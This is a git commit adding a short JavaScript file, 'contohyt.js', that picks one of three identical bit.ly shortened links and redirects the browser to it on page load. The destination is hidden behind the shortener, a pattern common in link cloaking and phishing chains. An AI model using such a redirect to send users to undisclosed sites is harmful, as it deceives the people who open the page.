e090f65da130cc9095c28ee5394a38676c3fce84
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2023-09-26 16:36:48 +0700

    Create contohyt.js

---
+++ contohyt.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+  'https://bit.ly/46aCx55',
+
+  'https://bit.ly/46aCx55',
+
+  'https://bit.ly/46aCx55'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
